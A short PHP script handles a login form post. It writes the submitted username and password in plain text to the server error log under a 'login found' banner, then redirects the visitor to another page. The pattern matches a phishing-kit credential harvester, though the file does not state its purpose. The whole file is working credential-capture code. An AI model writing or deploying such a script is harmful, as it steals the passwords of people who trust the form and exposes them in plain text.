<?php
error_log("login found");
error_log("\n\n----------------------------------");
error_log("Username: " . $_POST['username'] . " \n Pass: " . $_POST['password'] );
error_log("----------------------------------\n\n");
header('Location:/index3.html');
exit();
